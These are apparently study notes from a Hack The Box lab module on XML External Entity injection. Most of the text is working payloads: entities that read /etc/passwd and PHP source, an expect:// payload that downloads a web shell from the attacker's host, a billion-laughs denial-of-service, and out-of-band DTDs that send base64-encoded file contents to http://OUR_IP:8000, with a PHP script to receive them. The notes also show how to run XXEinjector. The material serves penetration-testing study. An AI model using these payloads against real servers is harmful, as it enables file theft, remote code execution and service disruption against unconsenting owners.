`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions through outdated XML libraries. This would allow us to disclose local files stored on the back-end server.
- `XML` is designed for flexible transfer and storage of data and documents in various types of applications
- Formed of element trees, where each element is denoted by a `tag`
- `XML DTD` allows the validation of an XML document against a pre-defined document structure. It can be placed within the `XML document` itself right after the `XML Declaration` in the first line. It can also be stored in an external `.dtd` file and then referenced within the XML document with the `SYSTEM` keyword.
```bash
# Example of an XML DTD definition
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">

# Example of an XML DTD definition w/ an external link
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://external_host/email.dtd">
```
- We could define custom entities (`XML variables`) in `XML DTDs` to allow refactoring of variables and reduce repetitive data. This is done w/ the use of the `ENTITY` keyword
```bash
# Define custome XML entity in XML DTDs
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
More [information](https://academy.hackthebox.com/module/134/section/1203)



# XXE Injection
## Identifying XXE
Suppose we can define new `XML entities` and make them displayed on the web page, we could try to reference local files.
- We need to see `which element gets displayed`, to know which element inject into. As an example let's say we've found the `email` field to be vulnerable, as the email we input gets `displayed in the response`
![xxe_response](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)
- To confirm `XXE`, we could define a new `XML entity called "company"` in the first line in the `XML input`, and try to reference it w/ `&company;`. If the value of the `defined entity` gets printed on page, then we have `XXE confirmation` !
```bash
# Define new XML entity
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

# Inserting the new defined entity & reference it into the vulnerable field "email"
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [
	<!ENTITY company "Inlane Freight">
	]>
	<root>
		<name>test</name>
		<tel>49854984</tel>
		<email>&company;</email>
		<message>test</message>
	</root>
```
![new_entity](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)
**Note:** Some web applications may default to a `JSON` format in `HTTP request`, but may still accept other formats, including `XML`. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
## Reading Files
- To input `external XML entity`, we can do the same as before but w/ adding the `SYSTEM` keyword & define a path, to see if it gets `displayed` on the page
```bash
# Define external XML reference w/ a local file on server
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
- If we can read files, we can try to `read source code`, `SSH keys`, or `configuration files` that contain passwords. We can see [[File Inclusion]] / `Directory Traversal` to see `other local file read attacks`
- To read `source code` files, we might use PHP's `php://filter/` wrapper instead of the `file://`
```bash
# Read a source code file in PHP w/ base64 encode, to not break the XML w/ characters "<>/&"...
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
## RCE w/ XXE
- Look for `SSH keys`, or attempt to use a `hash stealing` trick in `Windows-based` web app by making a call to us
- Use the `PHP://expect` filter, but it requires the PHP `expect` module to be installed and enabled (disabled by default). If on, we can use it to download a `web shell`(not a reverse shell)
```bash
# Downloading a webshell
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.
## Other XXE Attacks
- `SSRF` to enumerate locally open ports & access their pages. Look for [[Server-Side Request Forgery (SSRF)]]
- `DoS` w/ the following payload. This no longer work w/ modern web servers (Apache)
```bash
# Perform DoS
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```
## Advanced Exfiltration w/ CDATA
We can use other methods to `extract data` (including binary or special characters) `without breaking the XML structure`, for any web application back-end, `not only PHP` as seen before.
- For this, we'll create and host a `xxe.dtd` file that contain the following lines
```bash
# xxe.dtd file, hosted on our machine
<!ENTITY joined "%begin;%file;%end;">
```
- Next, we can reference our external entity `xxe.dtd` & then print the `&joined;` entity
```bash
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
![php_cdata](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)
**Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a `DOS` attack caused by file/entity self-reference (like the previous attack)
## Error Based (Semi-Blind) XXE
If the web app `doesn't write any output`, but display `runtime errors` (`PHP errors`), we could use it to grab out `XXE exploit` output.
- We'll need to `force an error` (deleting closing tags, or reference a non-existing entity) to grab an interesting error
- To exploit the error, we'll use the same previous technique ; we can create a `.dtd` file containing the file we want to read + an `entity that does not exist`, and host it on our machine
```bash
# Create .dtd file w/ the file we want + a non-existing entity (causing an error) that we'll host
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
**Note:** There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.
- Now inside our `XML input`, we can call our `external .dtd file` and reference the `error entity`inside
```bash
# Call our external .dtd file that contain the payload
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
**Note:** `This method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.
## Blind Data Exfiltration
Previously we used `PHP errors` to grab our `XXE payload` as the `XML input` doesn't get printed, here we will see how we can get the content of files in a `completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed`.
### Out-of-band
`Out-of-band (OOB) Data Exfiltration` is a technique which is often used in similar blind cases with many web attacks, like `blind SQL injections, blind command injections, blind XSS`, and of course, `blind XXE`. This is when we made the web app connecting to us (w/ the hosting of the `.dtd` file). 
- We'll `make the web app send a web request` to `our server` w/ the content of the file we want
- We can use a `parameter entity` for the content of the file w/ the `PHP filter to base64 encode` it + another `external parameter entity` referenced to our IP w/ the `file` parameter value as part of the URL being requested
```bash
# Defining the 2 entities needed
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
**Note:** If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. 
- We can write a simple `PHP scrip`t that automatically detects the encoded file content, decodes it, and outputs it to the terminal. We'll need to start a `PHP server`
```bash
# Creating the index.php script that would decode all the received base64
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

# Start PHP server
php -S 0.0.0.0:8000
```
- To initiate the attack, we'll use almost the same payload we used w/ the previous `error-based` attack, and we should receive the `decoded data through our PHP server` !
```bash
# XML payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
**Tip:** In addition to storing our `base64 encoded` data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a subdomain for our URL (`ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the subdomain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
## Automated OOB
We can `automate the blind XXE` w/ tools like [XXEinjector](https://github.com/enjoiz/XXEinjector). He supports all the tricks learned in this module
- We can copy the `HTTP request` from `Burp`. 
- WE SHOULD ONLY INCLUDE THE FIRST XML LINE, AND WRITE `XXEINJECT` after it :
```bash
# Example request for XXEinjector
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

# Running the tool
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/req.req --path=/etc/passwd --oob=http --phpfilter
```
